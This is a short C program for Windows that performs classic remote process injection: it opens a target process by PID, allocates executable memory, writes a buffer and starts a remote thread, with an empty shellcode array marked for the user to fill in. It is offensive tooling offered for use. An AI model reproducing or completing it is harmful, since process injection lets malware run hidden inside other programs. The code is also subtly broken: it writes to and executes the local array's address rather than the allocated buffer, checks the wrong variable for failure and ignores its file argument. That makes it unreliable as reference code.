#include <windows.h>
#include <stdio.h>

DWORD PID, TID = NULL;
HANDLE hProcess = NULL, hThread = NULL;
LPVOID rBuf = NULL;

unsigned char kxrPuke[] = {}; /* Replace this with your shellcode! */

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("[kxr] | Usage: %s <PID> <Shellcode_File_Path>\n", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("[kxr] | Hooking Process <%ld>\n", PID);

    /* Create Process */
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    printf("[kxr] | Hooked Process!\n\\---0x%p\n", hProcess);

    /* Is targetProcess NULL? */
    if (PID == NULL) {
        printf("[kxr] | Couldn't Hook Process <%ld>. With error: <%ld>\n", PID, GetLastError());
        return EXIT_FAILURE;
    }

    /* Allocate shellcode to Process */
    rBuf = VirtualAllocEx(hProcess, NULL, sizeof(kxrPuke), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("[kxr] | Allocated %zu-bytes with RWX Perms | <ReadWriteExecute>\n", sizeof(kxrPuke));

    /* Write the allocated memory to process */
    WriteProcessMemory(hProcess, kxrPuke, kxrPuke, sizeof(kxrPuke), NULL);
    printf("[kxr] | Wrote %zu-bytes to Process <%ld>\n", sizeof(kxrPuke), PID);

    /* Create thread to run shellcode */
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)kxrPuke, NULL, 0, 0, &TID);

    if (hThread == NULL) {
        printf("[kxr] | Failed to create thread. With error: %ld\n", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("[kxr] | Created Thread <%ld>\n\\---0x%p\n", TID, hThread);
    WaitForSingleObject(hThread, INFINITE);
    printf("[kxr] | GG'S. Closing all Thread's and Handle's\n");
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}
